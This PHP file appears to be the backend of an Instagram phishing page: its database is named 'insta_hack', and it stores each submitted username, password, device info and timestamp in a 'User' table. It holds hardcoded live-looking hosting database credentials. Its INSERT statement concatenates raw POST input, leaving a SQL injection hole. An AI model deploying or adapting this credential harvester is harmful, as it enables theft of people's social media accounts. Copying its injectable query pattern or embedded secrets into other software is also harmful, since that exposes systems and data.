<?php
$password_1 = $_POST["password"];
$username_1 =$_POST["username"];
$phone_info =$_POST["phone_info"];


           // $servername = "127.0.0.1";
            //  $username = "root";
            //  $password = "root";
              $database = "if0_35321460_insta_hack"; // Your database name
          
$servername = "sql309.infinityfree.com";
             $username = "if0_35321460";
             $password = "i93QJulP3Hbl";
        // $dbname = "if0_35321460_SarkarR"; // Your database name
          
          
          
          
          
          
          
        // Create a connection
        $conn = new mysqli($servername, $username, $password, $database);
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
    
    date_default_timezone_set('Asia/Kolkata');
$time = date('Y-m-d H:i:s');

//$date= $currentTimeInIndia;
    
    
    

function addCategory($username_1, $password_1,$time,$phone_info,$conn) {
   // $query = "INSERT INTO `Category` (`name`, `status`) VALUES ('$name', $status)";
   // $query= "INSERT INTO `User` (`username`, `password`,`time`) VALUES ('$username_1', '$password_1','$currentTimeInIndia')";
  // $query = "INSERT INTO `User` (`username`, `password`,`phone_info`) VALUES ('$username_1', '$password_1','$phone_info');";
    // $query = "INSERT INTO `User` (`username`, `password`, `phone_info`) VALUES ('$username_1', '$password_1', '$phone_info');";
  $query = "INSERT INTO `User` (`username`, `password`,`time`, `phone_info`) VALUES ('$username_1', '$password_1','$time', '$phone_info');";
   
     
    $result = mysqli_query($conn, $query);
    
    if ($result) {
        return 'ok';
    } else {
        return 'not';
    }
}



echo addCategory($username_1, $password_1,$time,$phone_info,$conn);
echo $phone_info;










?>